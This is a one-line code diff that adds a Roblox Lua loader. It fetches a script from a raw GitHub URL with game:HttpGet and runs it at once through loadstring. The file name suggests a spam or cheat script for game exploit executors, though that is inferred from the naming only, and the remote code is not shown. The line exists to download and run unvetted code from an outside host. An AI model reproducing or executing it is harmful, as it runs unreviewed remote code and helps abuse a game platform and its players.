@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/karinderya-spam1-w7meala9g0y5jl.lua"))()
